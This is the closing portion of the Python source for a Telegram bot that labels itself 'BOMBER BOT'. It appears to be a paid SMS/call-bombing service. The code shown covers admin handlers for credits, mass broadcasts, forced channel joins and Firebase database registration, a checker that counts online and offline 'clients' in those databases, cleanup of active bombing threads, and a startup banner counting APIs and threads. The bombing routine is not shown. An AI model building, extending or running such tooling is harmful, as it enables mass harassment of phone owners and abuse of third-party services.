        if action == "remove_credits":
            p = text.split()
            if len(p) != 2: return True
            tu, amt = int(p[0]), int(p[1])
            u = get_user(tu)
            if not u: return True
            update_user(tu, premium_credits=max(0, u["premium_credits"]-amt))
            await update.message.reply_text(f"✅ -{amt} from {tu}")
            context.user_data.pop("admin_action", None); return True
        if action.startswith("set_config:"):
            key = action.split(":",1)[1]
            try: v = int(text)
            except: return True
            set_config(key, v)
            await update.message.reply_text(f"✅ {key}={v}")
            context.user_data.pop("admin_action", None); return True
        if action == "bc_all":
            conn = db(); c = conn.cursor()
            c.execute("SELECT user_id FROM users")
            rows = c.fetchall(); conn.close()
            sent = failed = 0
            for (t,) in rows:
                try:
                    await context.bot.send_message(t, f"📢 {text}")
                    sent += 1
                except Exception: failed += 1
                await asyncio.sleep(0.05)
            await update.message.reply_text(f"✅ Sent: {sent}, Fail: {failed}")
            context.user_data.pop("admin_action", None); return True
        if action == "add_channel":
            ch = text
            if ch.startswith("https://t.me/"): ch = "@" + ch.rstrip("/").rsplit("/",1)[-1]
            if not ch.startswith("@"): ch = "@" + ch
            try:
                chat = await context.bot.get_chat(ch)
                label = chat.title or ch
            except Exception as e:
                await update.message.reply_text(f"❌ {e}"); return True
            conn = db(); c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO force_channels (id,label,url) VALUES (?,?,?)",
                      (ch, label, f"https://t.me/{ch.lstrip('@')}"))
            conn.commit(); conn.close()
            await update.message.reply_text(f"✅ Added: {label}")
            context.user_data.pop("admin_action", None); return True
        if action == "add_firebase":
            url = text.rstrip("/")
            if not (url.startswith("http") and ("firebaseio.com" in url or "firebasedatabase.app" in url)):
                await update.message.reply_text("❌ Invalid URL."); return True
            await update.message.reply_text("⏳ Validating...")
            stats = fetch_firebase_stats(url)
            if stats is None:
                await update.message.reply_text(f"❌ DEAD: `{url}`", parse_mode="Markdown")
                context.user_data.pop("admin_action", None); return True
            conn = db(); c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM firebases"); cnt = c.fetchone()[0]
            tag = f"FB{cnt+1}"
            try:
                c.execute("INSERT INTO firebases (url,tag) VALUES (?,?)", (url, tag))
                conn.commit()
            except Exception:
                conn.close()
                await update.message.reply_text("⚠️ Already added.")
                context.user_data.pop("admin_action", None); return True
            conn.close()
            firebase_cache[tag] = stats
            await update.message.reply_text(
                f"✅ *{tag}*\n\n🟢 {stats['online']} | 🔴 {stats['offline']} | 📊 {stats['total']}",
                parse_mode="Markdown")
            context.user_data.pop("admin_action", None); return True
    except Exception as e:
        log.error(f"admin_input: {e}")
    return False

# ===================== FIREBASE STATS =====================
firebase_cache = {}

def fetch_firebase_stats(url):
    try:
        r = get_session().get(f"{url.rstrip('/')}/clients.json", timeout=6)
        if r.status_code != 200: return None
        data = r.json()
        if not data or not isinstance(data, dict):
            return {"online": 0, "offline": 0, "total": 0}
        on = off = 0
        for d, i in data.items():
            if isinstance(i, dict) and i.get("status") is True: on += 1
            else: off += 1
        return {"online": on, "offline": off, "total": on + off}
    except Exception:
        return None

# ===================== ERROR HANDLER + CLEANUP =====================
async def error_handler(update, context):
    try:
        log.error(f"Error: {context.error}", exc_info=context.error)
    except Exception: pass

async def cleanup_task():
    while True:
        try:
            await asyncio.sleep(300)
            now = time.time()
            for uid in list(active_bombings_detail.keys()):
                if not bombing_active.get(uid) and \
                   now - active_bombings_detail[uid].get("started", now) > 600:
                    active_bombings_detail.pop(uid, None)
                    request_counts.pop(uid, None)
                    bombing_threads.pop(str(uid), None)
            with _join_lock:
                stale = [u for u, t in _join_cache.items() if now - t > 600]
                for u in stale: _join_cache.pop(u, None)
            log.info("[CLEANUP] done")
        except Exception as e:
            log.error(f"cleanup: {e}")

# ===================== MAIN =====================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel_cmd))
    app.add_handler(CallbackQueryHandler(join_callback, pattern=r"^join_"))
    app.add_handler(CallbackQueryHandler(user_callback,
        pattern=r"^(bomb:|bomb_type:|user:|rc:)"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern=r"^adm:"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_error_handler(error_handler)
    
    async def post_init(application):
        asyncio.create_task(cleanup_task())
    
    app.post_init = post_init
    
    print("=" * 60)
    print("✅ BOMBER BOT - FAST + CRASH-PROOF")
    print(f"🤖 Bot: {BOT_TOKEN.split(':')[0]}")
    print(f"👑 Owner: {OWNER_ID}")
    print(f"👮 Admins: {ADMIN_IDS}")
    print(f"🔌 APIs: {len(APIS)}")
    print(f"⚡ Threads: {THREAD_COUNT}")
    print(f"🛡️ Semaphore: {MAX_CONCURRENT_HANDLERS}")
    print("=" * 60)
    
    app.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()